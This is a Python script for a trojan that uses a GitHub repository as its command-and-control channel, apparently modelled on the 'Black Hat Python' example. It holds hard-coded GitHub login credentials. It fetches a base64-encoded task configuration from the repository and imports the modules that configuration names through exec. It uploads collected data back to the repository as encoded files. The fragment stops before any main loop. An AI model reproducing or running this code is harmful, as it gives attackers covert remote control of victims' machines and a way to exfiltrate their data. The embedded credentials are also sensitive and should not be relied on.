#!/usr/bin/env python3


import os, sys
import imp
import time
import json
import queue
import base64
# import random
import threading

from github3 import login


# trojan id
trojan_id = 'simple'
trojan_config = '%s.json' % trojan_id
trojan_data = 'data/%s/' % trojan_id
trojan_modules = []
configured = False
trojan_queue = queue.Queue()


def connet2git():
    git = login(username='wick.zt', password='Ithink')
    repo = git.repository('wick.zt', 'BHP7')
    branch = repo.branch('master')
    return git, repo, branch


def get_contents(filepath):
    git, repo, branch = connet2git()
    tree = branch.commit.commit.tree.recurse()
    for f in tree.tree:
        if filepath in f.path:
            print('[*] Found file %s' % filepath)
            blob = repo.blob(f._json_data['sha'])
            return blob.content
    return None


def get_config():
    global configured
    _json = get_contents(trojan_config)
    cnf = json.loads(base64.b64decode(_json))
    configured = True
    for task in cnf:
        if task['module'] not in sys.modules:
            exec('import %s' % task['module'])
    return cnf


def store_module_result(data):
    git, repo, branch = connet2git()
    # remote_path = 'data/%s/%d.data' % (trojan_id, random.randint(1000, 100000))
    remote_path = 'data/%s/%d.data' % (trojan_id, id(trojan_id))
    repo.create_file(remote_path, 'Commit message', base64.b64encode(data))

